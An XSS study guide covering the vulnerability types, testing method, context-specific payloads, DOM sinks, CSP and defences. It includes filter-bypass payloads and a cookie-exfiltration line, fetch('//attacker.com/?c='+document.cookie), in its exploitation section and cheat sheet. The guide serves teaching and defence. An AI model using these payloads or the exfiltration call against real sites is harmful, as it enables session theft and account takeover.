# Cross-Site Scripting (XSS) 

## Table of Contents

1. [What is XSS?](#1-what-is-xss)
2. [How XSS Works — The Core Mechanic](#2-how-xss-works--the-core-mechanic)
3. [The Three Types of XSS](#3-the-three-types-of-xss)
   - 3.1 [Reflected XSS](#31-reflected-xss)
   - 3.2 [Stored XSS](#32-stored-xss)
   - 3.3 [DOM-Based XSS](#33-dom-based-xss)
4. [Self-XSS — A Special Case](#4-self-xss--a-special-case)
5. [Finding XSS — Testing Methodology](#5-finding-xss--testing-methodology)
6. [XSS Contexts — Where Your Payload Lands](#6-xss-contexts--where-your-payload-lands)
   - 6.1 [Between HTML Tags](#61-between-html-tags)
   - 6.2 [Inside HTML Tag Attributes](#62-inside-html-tag-attributes)
   - 6.3 [Inside Existing JavaScript](#63-inside-existing-javascript)
   - 6.4 [JavaScript Template Literals](#64-javascript-template-literals)
7. [DOM XSS — Sources & Sinks Deep Dive](#7-dom-xss--sources--sinks-deep-dive)
8. [DOM XSS in Third-Party Libraries](#8-dom-xss-in-third-party-libraries)
9. [Client-Side Template Injection (AngularJS)](#9-client-side-template-injection-angularjs)
10. [Exploiting Confirmed XSS](#10-exploiting-confirmed-xss)
11. [Dangling Markup Injection](#11-dangling-markup-injection)
12. [Content Security Policy (CSP)](#12-content-security-policy-csp)
13. [Defense & Prevention](#13-defense--prevention)
14. [Quick Reference Cheat Sheet](#14-quick-reference-cheat-sheet)

---

## 1. What is XSS?

Cross-site scripting is a vulnerability that lets an attacker make a website return **malicious JavaScript to its own users**. When that JavaScript executes in a victim's browser, it runs in the **trusted context of that website** — meaning it can read the page's data, make authenticated requests, and interact with the application exactly as the victim would.


### The Same-Origin Bypass

Browsers enforce the **same-origin policy** — scripts from one origin cannot read data belonging to a different origin. XSS doesn't break this rule technically; it **cheats around it**. The malicious script isn't cross-origin at all — it gets the website to serve the script *as if the website itself wrote it*. The browser has no way to know the script wasn't intended by the site owner.

### What an Attacker Can Achieve

- Impersonate or masquerade as the victim user
- Carry out any action the victim user can perform
- Read any data the victim user can access
- Capture login credentials
- Virtually deface the website
- Inject trojan functionality into the site

---

## 2. How XSS Works — The Core Mechanic

### The Root Cause

XSS exists when an application takes data that is at least partly attacker-controllable and embeds it into a page **without neutralizing characters that have special meaning to the browser** (`<`, `>`, `"`, `'`, etc.). The browser's HTML/JS parser then treats the attacker's data as markup or code instead of as plain text.

```
Attacker-controlled input
        │
        ▼
Application embeds it into a response   ← injection point: no encoding applied here
        │
        ▼
Browser parses the response as HTML/JS
        │
        ▼
Browser executes the embedded script    ← attacker's code runs with the site's trust
```

### Minimal Working Example

```
Normal:    https://insecure-website.com/status?message=All+is+well.
Response:  <p>Status: All is well.</p>

Attack:    https://insecure-website.com/status?message=<script>/* Bad stuff here */</script>
Response:  <p>Status: <script>/* Bad stuff here */</script></p>
```

The application never validated or encoded the `message` parameter — it copied it straight into the HTML response. The browser, parsing that HTML, sees a legitimate `<script>` tag and runs it.

---

## 3. The Three Types of XSS

| Type | Where the script comes from | Persistence |
|------|----------------------------|-------------|
| **Reflected** | The current HTTP request | One-time — only affects the request that carries the payload |
| **Stored** | The website's database / storage | Persistent — affects every user who later views the stored content |
| **DOM-based** | Client-side JavaScript processing untrusted data | Depends entirely on the page's own script logic, not the server |

---

### 3.1 Reflected XSS

**What it is:** The application receives data in an HTTP request and includes that data in the **immediate** response without proper handling.

**Mechanism:**
```
Attacker crafts a malicious URL
        │
        ▼
Victim is tricked into visiting it (phishing, link, etc.)
        │
        ▼
Server reflects the payload back in the response
        │
        ▼
Victim's browser executes it — in the victim's own session context
```

**Example:**
```
https://insecure-website.com/status?message=<script>/* Bad stuff here... */</script>
```

**Why reflected XSS needs an external delivery mechanism:** Unlike stored XSS, the attack only fires when the victim actually visits the crafted URL. The attacker must get the victim to click a link, open an email, or load a malicious page — there's no self-contained way to trigger it from within the application itself.

**Impact relative to stored XSS:** Because reflected XSS depends on timing — the victim must be logged in *and* click the link *at the same time* — its real-world impact is often considered lower than stored XSS, where the victim is guaranteed to be logged in when they encounter the payload naturally.

---

### 3.2 Stored XSS

**What it is** (also called persistent or second-order XSS): the application receives data from an untrusted source, stores it (typically in a database), and later includes that stored data in HTTP responses to **other users** without proper handling.

**Sources of untrusted data aren't limited to direct user input.** They can include:
- Comments on a blog post
- User nicknames in a chat room
- Contact details on a customer order
- Messages received over SMTP and displayed in a webmail client
- Social media posts displayed by a marketing application
- Packet data from network traffic shown in a monitoring tool

**Mechanism:**
```
Attacker submits malicious content (comment, profile field, message)
        │
        ▼
Application stores it (database, file, etc.) — no sanitization
        │
        ▼
A different user (or the attacker's intended victim) loads a page that includes it
        │
        ▼
Victim's browser executes the payload — in the victim's session context
```

**Example:**
```
Normal comment stored:    <p>Hello, this is my message!</p>
Malicious comment stored: <p><script>/* Bad stuff here... */</script></p>
```

**Why stored XSS is generally more severe:** The attack is **self-contained** — the attacker doesn't need to externally lure anyone. They place the payload once, and it fires automatically whenever any user (including privileged users like admins) views the affected content. This is especially dangerous in apps where the XSS only affects logged-in users, since stored XSS guarantees the victim is authenticated when they encounter it — reflected XSS does not.

**Finding the entry/exit point mapping (the hard part of stored XSS testing):**

The exit points (everywhere a response is returned to any user) are not limited to obvious form outputs. They include **every HTTP response in every situation** — even header values that wouldn't be exploitable for reflected XSS might become exploitable when stored and later rendered elsewhere. Out-of-band delivery routes also exist: a webmail app processes email content; a Twitter-feed widget processes third-party tweets; a news aggregator includes content from other sites. All of these are potential entry points for stored XSS that don't go through the application's own forms.

---

### 3.3 DOM-Based XSS

**What it is:** The vulnerability exists entirely in **client-side JavaScript**, not in server-side code. A script on the page takes data from an attacker-controllable **source** and passes it to a **sink** that supports dynamic code execution — without the server ever being involved in the unsafe step.

**Mechanism:**
```javascript
var search = document.getElementById('search').value;   // SOURCE
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;       // SINK — unsafe
```

If the attacker controls the input field's value (commonly via a URL parameter that populates it), they can inject:
```
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

**The most common source is the URL** — accessed through `window.location`. An attacker constructs a malicious link with the payload in the query string or fragment (hash). In some cases — targeting a 404 page, or a PHP-based site — the payload can even be placed in the **URL path** itself.

**Why this is fundamentally different from reflected/stored XSS:** The server may never see or process the malicious data at all. If a script reads data straight from `location.hash` and writes it to a dangerous sink, the entire vulnerability is **client-side only** — no server round-trip is involved in the dangerous step.

---

## 4. Self-XSS — A Special Case

**What it is:** Behavior identical to reflected XSS, but it **cannot be triggered through a normal crafted URL or cross-domain request**. It only fires if the **victim themselves** submits the payload from their own browser.

**Why this matters:** Self-XSS requires social engineering — convincing the victim to paste attacker-supplied input into their own browser (a search box, a console, a form field). Because the victim has to actively perform the injection step themselves, self-XSS is generally considered lower severity and is often excluded from bug bounty scope, since it doesn't represent a vulnerability an attacker can trigger unilaterally.

---

## 5. Finding XSS — Testing Methodology

### Reflected & Stored XSS — Manual Testing Process

```
Step 1: Test every entry point
   → Submit a simple unique alphanumeric string into every parameter,
     form field, header, and cookie the application accepts.

Step 2: Identify every reflection point
   → Find every location in the HTTP response where your unique
     string is echoed back.

Step 3: Determine the XSS context for each reflection
   → For each location, identify exactly what surrounds your input:
     HTML body text? An attribute value? Inside a <script> block?

Step 4: Test alternative payloads based on context
   → If your first payload was blocked, modified, or encoded, choose
     a payload suited to the specific context (see Section 6).

Step 5: Confirm execution in an actual browser
   → Test in Burp Repeater first, then transfer the working payload
     to a real browser (paste URL, or modify in Burp Proxy intercept)
     to confirm actual JavaScript execution — not just reflection.
```

**Standard confirmation payload:** `alert(document.domain)` — short, harmless, and visibly proves arbitrary JS execution while also showing *which* domain it executed on (useful when testing across subdomains or after redirects).

> **Chrome-specific note:** From Chrome 92 onward, cross-origin iframes are blocked from calling `alert()`. For payloads delivered via iframes (common in advanced attacks), use `print()` instead as the proof-of-concept function.

### DOM-Based XSS — Manual Testing Process

**For HTML sinks (URL-based sources):**
```
Step 1: Place a unique alphanumeric string into the source (e.g. location.search)
Step 2: Open browser DevTools, use Ctrl+F (Cmd+F) to search the LIVE DOM
         (View Source does NOT work — it shows the original HTML, not what
          JavaScript has modified at runtime)
Step 3: For every location your string appears, identify the context
         (is it inside an attribute? Plain text? Inside a script block?)
Step 4: Try breaking out of that specific context based on what surrounds it
```

**For JavaScript execution sinks (harder — input doesn't visibly appear in DOM):**
```
Step 1: Use Ctrl+Shift+F (Cmd+Alt+F) to search ALL page JavaScript for
         the source object (e.g. "location")
Step 2: Set a breakpoint where the source is first read
Step 3: Use the debugger to trace where that value flows — it may get
         assigned to other variables; track each one
Step 4: When you find a sink receiving tainted data, hover the variable
         in the debugger to inspect its value right before the sink call
Step 5: Refine your payload based on what the sink does with the data
```

**Browser URL-encoding behavior matters:** Chrome, Firefox, and Safari automatically URL-encode `location.search` and `location.hash` before JavaScript reads them. Internet Explorer 11 and pre-Chromium Edge do **not**. If your payload gets URL-encoded before the vulnerable script processes it, the attack is unlikely to succeed in modern browsers — test the actual decoding behavior rather than assuming.

**DOM Invader:** Burp's built-in browser extension automates much of this tedious source-to-sink tracing — especially valuable against complex, minified JavaScript where manual tracing would take hours.

---

## 6. XSS Contexts

Identifying the **context** — exactly where your input lands in the response, and what processing it undergoes — is the single most important step in building a working payload. The same vulnerability requires completely different payloads depending on context.

### 6.1 Between HTML Tags

When your input lands as plain text between tags, you need to introduce new HTML elements that trigger JavaScript:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

The `<img>` variant is useful when `<script>` tags get filtered — the browser still parses `<img>`, fails to load the invalid source `1`, and fires the `onerror` event handler.

### 6.2 Inside HTML Tag Attributes

**If angle brackets aren't filtered**, terminate the attribute, close the tag, and inject a new one:
```html
"><script>alert(document.domain)</script>
```

**If angle brackets ARE blocked or encoded** (the common case), you usually can't break out of the tag entirely — but if you can still terminate the *attribute value*, you can introduce a brand-new attribute that creates its own scriptable context:
```html
" autofocus onfocus=alert(document.domain) x="
```

Breaking this down:
- `"` — closes the current attribute value
- `autofocus` — new attribute forcing the element to gain focus immediately, without user interaction
- `onfocus=alert(document.domain)` — fires when focus is gained
- `x="` — gracefully "repairs" the markup so the rest of the tag remains syntactically valid

**When the context itself is naturally scriptable** (e.g., an `href` attribute), you don't need to terminate anything — use the `javascript:` pseudo-protocol directly:
```html
<a href="javascript:alert(document.domain)">
```

**Advanced — access keys for filtered contexts:** Some tags (like `<link rel="canonical">`) don't normally fire events automatically, but if angle brackets are encoded while you can still inject attributes, the `accesskey` attribute can define a keyboard shortcut that fires an event when the victim presses a specific key combination — exploitable with user interaction on Chrome.

### 6.3 Inside Existing JavaScript

This context has several distinct sub-cases depending on exactly where your input lands within the script.

**Sub-case A — Terminating the entire script block:**

If the context looks like:
```html
<script>
var input = 'controllable data here';
</script>
```

You can close the script tag and start fresh HTML, regardless of leaving the original script syntactically broken:
```html
</script><img src=1 onerror=alert(document.domain)>
```

**Why this works:** The browser performs HTML parsing *before* JavaScript parsing. It identifies that `</script>` ends the script block at the HTML-parsing stage — the fact that the original JavaScript is left with an unterminated string literal doesn't matter, because the broken script and the new HTML afterward are parsed and handled independently.

**Sub-case B — Breaking out of a JavaScript string literal:**

If your input lands inside quotes:
```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

Both close the string with the matching quote character, inject your own statement, and either neutralize what follows (`-`) or comment it out (`//`).

**The backslash-escaping bypass:** If the application escapes your quote character with a backslash (`'` → `\'`), it has often made the classic mistake of **not escaping the backslash itself**. You can exploit this by submitting your own backslash first:

```
You submit:        \';alert(document.domain)//
App converts to:    \\';alert(document.domain)//
```

The first backslash you submitted neutralizes the *second* backslash (the one the app would have added) — making the app's added backslash a literal character instead of an escape character. The single quote that follows is now interpreted as a real string terminator, and the attack succeeds.

**Calling functions without parentheses (WAF bypass):** When parentheses or specific characters are blocked, use the `throw` statement combined with the global error handler:
```javascript
onerror=alert;throw 1
```
This assigns `alert` as the global exception handler, then `throw 1` raises an exception passing `1` as the argument — effectively calling `alert(1)` without ever writing `alert(1)` literally.

**Sub-case C — HTML-encoding bypass inside attribute-based JavaScript:**

When the context is JavaScript inside a quoted **tag attribute** (like an `onclick` handler), and the application blocks/escapes quote characters at the JavaScript level, you can bypass it using **HTML entities** instead:

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

Payload:
```html
&apos;-alert(document.domain)-&apos;
```

**Why this works:** The browser HTML-decodes attribute values **before** the JavaScript inside them is parsed. `&apos;` (HTML entity for `'`) gets decoded back into a literal quote character at the HTML-parsing stage — by the time the JavaScript engine reads the attribute's content, it sees a real quote acting as a string delimiter, even though the server-side filter never saw a raw quote character to block.

### 6.4 JavaScript Template Literals

Template literals use backticks and support embedded expressions via `${...}`:

```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

If your input lands inside a template literal, you **don't need to terminate it at all** — just inject your own `${...}` expression directly:

```javascript
${alert(document.domain)}
```

If the context is:
```javascript
var input = `controllable data here`;
```

The payload `${alert(document.domain)}` gets evaluated as a JavaScript expression embedded in the literal, executing immediately when the literal is processed — no backtick-breaking required.

---

## 7. DOM XSS — Sources & Sinks Deep Dive

A page is DOM-XSS-vulnerable whenever there's an **executable path from a source to a sink**.

### Key Sinks That Lead to DOM XSS

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent           (any inline event-handler property)
```

### Sink-Specific Exploitation Behavior

**`document.write()` sink:** Accepts `<script>` elements directly:
```javascript
document.write('... <script>alert(document.domain)</script> ...');
```
Note that surrounding context (existing open tags) may need to be closed first within your payload for the injected script tag to parse correctly.

**`innerHTML` sink:** On all modern browsers, `<script>` elements **do not execute** when inserted via `innerHTML`, and `<svg onload>` doesn't fire either. You must pivot to elements with executable event handlers instead:
```javascript
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

### DOM XSS Combined with Reflected/Stored Data

DOM XSS isn't always purely client-side — sources can also originate **from the server**, creating hybrid vulnerability classes:

**Reflected DOM XSS:** Server echoes URL data into the response (e.g., embedded in a JS string literal or a form field), and a client-side script then unsafely processes *that already-reflected* data into a sink:
```javascript
eval('var data = "reflected string"');
```
The "reflected string" portion originated from the request; the danger is the `eval()` that processes it afterward.

**Stored DOM XSS:** Server stores data from one request, then includes it in a *later* response. A script in that later response then unsafely processes it:
```javascript
element.innerHTML = comment.author
```
Here `comment.author` was stored server-side from a previous submission; the dangerous step is the client-side `innerHTML` assignment when it's later rendered.

**Why this distinction matters:** Pure DOM XSS (URL → sink, all client-side) requires the victim to load a maliciously crafted URL. Reflected/stored DOM XSS hybrids can sometimes be exploited through normal application use (the attacker just submits data through a normal form) since the server is involved in propagating the data, even though the actual unsafe execution step still happens in client-side JavaScript.

---

## 8. DOM XSS in Third-Party Libraries

Modern apps depend heavily on libraries — these introduce their own sources and sinks beyond the page's own code.

### jQuery

**`attr()` as a sink:** Can alter DOM element attributes using URL-derived data:
```javascript
$(function() {
    $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

Exploitation — inject a `javascript:` URL via the parameter:
```
?returnUrl=javascript:alert(document.domain)
```
When the victim clicks the resulting link (now pointing to your injected `javascript:` URL), it executes.

**The classic `$()` selector + `location.hash` vulnerability:**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

Since `location.hash` is attacker-controllable, and jQuery's `$()` selector historically accepted HTML strings, an attacker could inject an XSS vector directly as if it were a CSS selector. Modern jQuery patches this for inputs starting with `#`, but **inputs without a `#` prefix can still be vulnerable** in newer versions.

**Triggering `hashchange` without user interaction (since direct navigation requires a click):**
```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
The iframe loads the target with an empty hash, then on load, JavaScript appends the XSS vector to the hash — this change in the fragment fires the `hashchange` event automatically, no victim interaction needed.

### AngularJS

If a page uses the `ng-app` attribute, AngularJS actively processes the page's content. Critically, it will **execute JavaScript inside double curly braces** (`{{...}}`) wherever they appear — in HTML body text or even inside attributes — without needing any angle brackets or event handlers at all. This opens an entirely separate injection surface from standard HTML/JS XSS (see Section 9).

---

## 9. Client-Side Template Injection (AngularJS)

When a site uses a client-side template framework like AngularJS and unsafely embeds user input into a template, an attacker can inject template expressions directly — a distinct vulnerability class from standard XSS, requiring no angle brackets at all.

### The AngularJS Sandbox

Older versions of AngularJS ran expressions inside a restricted **sandbox** intended to prevent access to dangerous global objects (like `window` or `document`) from within `{{ }}` expressions. The sandbox was eventually removed in later AngularJS versions due to being fundamentally unfixable — but it's still relevant for legacy sites running older versions.

### Sandbox Escape Concept

The sandbox blocked direct references to dangerous globals, but the AngularJS framework's own internal objects (constructors, prototypes) were still reachable from inside expressions. By chaining through AngularJS's internal object structure — typically via constructor references — researchers found ways to reach `Function` constructors and ultimately execute arbitrary JavaScript, fully escaping the intended sandbox restrictions.

### Why It Matters for CSP Bypass

Because AngularJS sandbox escapes execute through the **framework's own legitimate code path** (not through directly injected `<script>` tags), they can sometimes execute even under a strict Content Security Policy that would normally block inline scripts — since the policy sees AngularJS's own trusted script executing the expression evaluator, not an attacker-injected script tag.

---

## 10. Exploiting Confirmed XSS

Once `alert(document.domain)` confirms execution, real exploitation goes further — proving actual business impact.

### To Steal Cookies

Classic approach: redirect the victim's session cookie to an attacker-controlled domain, then use it to impersonate them.

**Real-world limitations of cookie theft:**
- The victim might not be logged in at the moment the script runs
- The `HttpOnly` flag on a cookie makes it completely invisible to JavaScript — most modern session cookies use this
- Sessions are sometimes bound to additional factors like the user's IP address, making a stolen cookie alone insufficient
- The session may expire before the attacker manages to use it

### To Capture Passwords

A more modern and often more effective technique: create a hidden password input field. Browser **password managers will auto-fill** it if they have saved credentials for that origin. The script then reads the auto-filled value and exfiltrates it to an attacker-controlled domain.

**Why this technique is often preferred over cookie theft:**
- Bypasses `HttpOnly` entirely — the issue isn't reading a cookie, it's reading a form field value
- Bypasses session-binding defenses (IP locking, session timeout) since you get the actual password, not a session token
- Often yields **more value than just one account** — if the victim reused that password elsewhere, the attacker now has credentials usable across multiple services

**Limitation:** Only works against victims whose browser has a saved password for that exact origin. (A targeted phishing-style fallback exists for victims without saved credentials, but that's a separate social engineering technique, not a direct exploit.)

### To Bypass CSRF Protections

This is the most powerful XSS exploitation pattern because it turns a "one-way" vulnerability into "two-way" communication.

**The core insight:** Traditional CSRF lets an attacker make the victim's browser **send** a request, but the attacker **cannot read the response**. XSS removes that limitation entirely — the attacker's injected script runs *inside* the victim's authenticated session and can both send arbitrary requests **and** read whatever comes back, including anti-CSRF tokens embedded in the page.

**Example attack chain:**
```
1. Application allows logged-in users to change their email without re-entering a password
2. Attacker's XSS payload reads the page's CSRF token directly from the DOM/response
3. Script sends an authenticated request to change the victim's email to one the attacker controls
   (using the legitimately-read CSRF token, so the request isn't blocked)
4. Attacker triggers "forgot password" using the now-attacker-controlled email
5. Attacker receives the password reset link → full account takeover
```

**Why CSRF tokens provide zero protection against this:** A CSRF token's entire security model assumes the attacker can send requests but never read the responses (since cross-origin reads are blocked by browser policy). XSS operates *same-origin* from the browser's perspective — there is no cross-origin boundary to enforce, so the token can simply be read and reused like any other page data.

---

## 11. Dangling Markup Injection

A technique for situations where full XSS isn't achievable (input filters block script-capable payloads), but you can still inject **some** HTML — enough to capture sensitive data cross-domain without ever executing JavaScript.

### Core Concept

You inject an **unclosed** HTML tag (commonly an `<img>` or attribute-opening sequence) that causes the browser to interpret everything *after* your injection point — up until it finds a closing character your tag is looking for — as part of that tag's attribute value. This "dangling" content then gets sent to a URL you control as part of a request the browser automatically makes (e.g., loading an image).

### Why It Works Without JavaScript

Browsers render HTML incrementally and greedily attempt to complete unclosed elements using whatever markup comes next in the document. If your injected tag's attribute (like `src=`) is left unterminated, the browser will keep consuming page content — including sensitive values like CSRF tokens that appear later in the same page — until it finds a quote character or another tag boundary, then send all of that consumed text as the URL/attribute value.

### What It Can Capture

- CSRF tokens that appear later in the same page response
- Other sensitive values rendered after the injection point that the attacker shouldn't otherwise see
- Any text content positioned after the dangling tag, up to the next quote or tag-closing character

This is most relevant where strict filters block `<script>`, event handlers, and `javascript:` URLs but still permit some raw, unencoded HTML tags through.

---

## 12. Content Security Policy (CSP)

CSP is a browser-enforced mechanism that aims to **reduce the impact** of XSS — it is a mitigation layered on top of proper input handling, not a replacement for it.

### How CSP Works

The server sends a `Content-Security-Policy` HTTP response header defining rules for what the page is allowed to load and execute:

```
default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
```

This example restricts all resource loading (scripts, images, etc.) to the page's own origin. Even if an attacker successfully injects an XSS payload, the browser will refuse to execute inline scripts or load scripts from any other origin — significantly limiting what the injected code can actually do.

### Whitelisting Domains — A Common Mistake

If a policy whitelists an entire external domain for `script-src`, an attacker can potentially load **any** script hosted on that domain — including ones they control or ones with known XSS-enabling behavior on that domain. Domain whitelisting is much weaker than it appears; hosting required resources on your own origin is safer than trusting an external domain wholesale.

### Nonce-Based and Hash-Based Policies

When external scripts genuinely must be allowed, two stronger mechanisms exist:
- **Nonce-based:** A random, server-generated string is added as an attribute to each legitimate script tag. The CSP only permits scripts whose nonce attribute matches the one specified in the policy header for that specific response. An attacker injecting their own script tag cannot guess the per-response random nonce.
- **Hash-based:** The CSP specifies the cryptographic hash of permitted inline script content. Only scripts whose exact content matches an allowed hash will execute.

### When CSP Can Be Bypassed

If the application has an XSS-like behavior that overlaps with a CSP gap (e.g., a whitelisted domain that itself hosts an exploitable endpoint, or a framework like AngularJS executing through its own trusted code path as discussed in Section 9), the underlying vulnerability can often still be exploited **despite** the CSP being present.

---

## 13. Defense & Prevention

Effective prevention is **not a single fix** — it requires multiple layered defenses, because no single technique is bulletproof on its own.

### Defense 1 — Encode Data on Output (Primary Defense)

Encoding must be applied **immediately before** writing user-controllable data into the response — and the type of encoding required depends entirely on the destination context.

**HTML context:**
```
<  →  &lt;
>  →  &gt;
```

**JavaScript string context (Unicode-escaping, not HTML-escaping):**
```
<  →  \u003c
>  →  \u003e
```

**Layered encoding for combined contexts:** Embedding user input inside an event handler attribute requires **both** layers, applied in the correct order — first Unicode-escape for the JavaScript context, then HTML-encode for the attribute context:
```html
<a href="#" onclick="x='This string needs two layers of escaping'">test</a>
```

### Defense 2 — Validate Input on Arrival

Encoding alone isn't sufficient in every context — strict input validation at the point of first receipt is the second required layer.

**Examples of effective validation:**
- If a submitted value is expected to be a URL, validate it starts with `http://` or `https://` — block `javascript:` and `data:` pseudo-protocols
- If a value is expected to be numeric, validate it's actually an integer
- Validate input contains only an expected character set

**Critical principle: reject, don't sanitize.** Blocking invalid input outright is far more reliable than attempting to "clean" bad input into something safe — sanitization logic is itself error-prone and a frequent source of bypasses.

### Defense 3 — Whitelisting Over Blacklisting

Always validate against a list of **known-safe** values rather than trying to enumerate every dangerous one.

```
BAD (blacklist):  block "javascript", "data", "vbscript" protocols
GOOD (whitelist):  only allow "http", "https" protocols — reject everything else
```

A blacklist breaks the moment a new dangerous pattern emerges that wasn't anticipated. A whitelist's security doesn't degrade over time the same way.

### Defense 4 — Allowing "Safe" HTML (When Required by the Business)

If users must be able to post some HTML (blog comments, rich text), filtering it securely is **extremely difficult** to implement from scratch — browser parsing quirks and mutation XSS make naive tag/attribute whitelists unreliable.

**Recommended approach:** Use a maintained, purpose-built sanitization library (such as DOMPurify) rather than writing your own filter. Even these libraries occasionally have their own XSS-related vulnerabilities, so staying current with security updates is mandatory, not optional.

**Don't forget non-JavaScript risks:** Malicious CSS and even plain HTML structure can themselves be harmful in specific contexts (e.g., CSS-based data exfiltration attacks) — "safe HTML" filtering needs to account for more than just script tags.

### Defense 5 — Template Engine Escaping

Modern server-side template engines (Twig, Freemarker, etc.) provide built-in context-aware escaping:

```twig
{{ user.firstname | e('html') }}
```

Some engines (Jinja, React) escape dynamic content **by default**, which prevents most XSS automatically as long as developers don't deliberately bypass the default behavior.

**Critical distinction from SSTI:** If user input is concatenated directly into the **template string itself** (rather than passed as a variable into a defined slot), the result is **server-side template injection** — a related but generally more severe vulnerability than XSS, since it can lead to full remote code execution rather than just client-side script execution.

### Defense 6 — Language-Specific Output Encoding

**PHP:**
```php
<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8'); ?>
```
The `ENT_QUOTES` flag ensures both single and double quotes get encoded — omitting it leaves one quote type exploitable. PHP has no built-in Unicode-escaping function for JavaScript contexts, so a custom escaping function is required when embedding data inside `<script>` blocks.

**Client-side JavaScript** (no built-in HTML encoder exists natively):
```javascript
function htmlEncode(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '&#'+c.charCodeAt(0)+';';
    });
}
```

**jQuery-specific:** The most common jQuery XSS pattern is passing untrusted data (like `location.hash`) directly into a jQuery selector. Modern jQuery only renders input as HTML if it begins with `<` — but you should still explicitly escape any untrusted value passed to a selector rather than relying solely on this internal protection.

### Defense 7 — Response Headers for Non-HTML Responses

For HTTP responses that are never meant to contain HTML or JavaScript (JSON APIs, plain text downloads), set headers that force the browser to interpret them strictly as declared:
```
Content-Type: application/json
X-Content-Type-Options: nosniff
```
`X-Content-Type-Options: nosniff` prevents the browser from trying to "guess" a different content type (MIME sniffing) and rendering the response as HTML even though the server declared something else.

### Defense 8 — Content Security Policy (Last Line of Defense)

CSP should never be the *only* defense, but as a backstop against defenses that fail elsewhere, a properly scoped policy meaningfully limits the blast radius of any XSS that does slip through (see Section 12 for full mechanics).

---

## 14. Quick Reference Cheat Sheet

### Confirmation Payloads

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
print()                          <!-- use instead of alert() for cross-origin iframes on Chrome 92+ -->
```

### Context-Based Payload Selection

```
Between HTML tags:
  <script>alert(document.domain)</script>
  <img src=1 onerror=alert(1)>

Inside an attribute (angle brackets blocked):
  " autofocus onfocus=alert(document.domain) x="

Inside href/src (scriptable attribute context):
  javascript:alert(document.domain)

Inside existing <script> block (full script termination):
  </script><img src=1 onerror=alert(document.domain)>

Inside a JS string literal:
  '-alert(document.domain)-'
  ';alert(document.domain)//

JS string literal with backslash-escaping filter bypass:
  \';alert(document.domain)//

Inside JS template literal (backticks):
  ${alert(document.domain)}

HTML-encoded bypass for quote-filtered attribute JS:
  &apos;-alert(document.domain)-&apos;

Function call without parentheses (WAF bypass):
  onerror=alert;throw 1
```

### DOM XSS — Key Sinks to Search For

```
document.write() / document.writeln()
document.domain
element.innerHTML / element.outerHTML
element.insertAdjacentHTML
element.onevent (any inline handler)

jQuery sinks: html(), append(), before(), after(), animate(),
              insertAfter(), insertBefore(), replaceWith(),
              wrap(), $.parseHTML(), attr() [for URL attrs]
```

### DOM XSS — Common Sources

```
location / location.search / location.hash / location.pathname
document.URL / document.documentURI / document.referrer
window.name
document.cookie
postMessage data
```

### jQuery Exploitation Snippets

```javascript
// javascript: URL injection via attr() sink
?returnUrl=javascript:alert(document.domain)

// Trigger hashchange without user interaction
<iframe src="https://target.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

### Exploitation Goals Beyond alert()

```
Cookie theft:        fetch('//attacker.com/?c='+document.cookie)
Password capture:    create hidden <input type=password>, read auto-filled value, exfiltrate
CSRF token theft:    fetch page, parse out token from response body, reuse in forged request
```

### CSP Quick Reference

```
Strict baseline policy:
  default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';

Nonce-based (per-response random token on each legit script tag):
  script-src 'nonce-{random-per-response-value}'

Hash-based (exact inline script content hash):
  script-src 'sha256-{base64-hash-of-script-content}'
```

### Defense Decision Reference

```
Output going into HTML body text          → HTML-entity encode (&lt; &gt; &amp; &quot; &#39;)
Output going into a JS string literal      → Unicode-escape (\u003c \u003e etc.)
Output going into an HTML attribute        → HTML-entity encode
Output going into a JS template literal    → Unicode-escape + ensure no ${} injection
Output is a URL                            → Validate protocol whitelist (http/https only)
Output is expected to be numeric           → Validate as integer, reject non-numeric
Response is non-HTML (JSON, plain text)    → Content-Type + X-Content-Options: nosniff
User-supplied rich text/HTML required      → Use a maintained sanitizer (e.g. DOMPurify), not custom filter
```
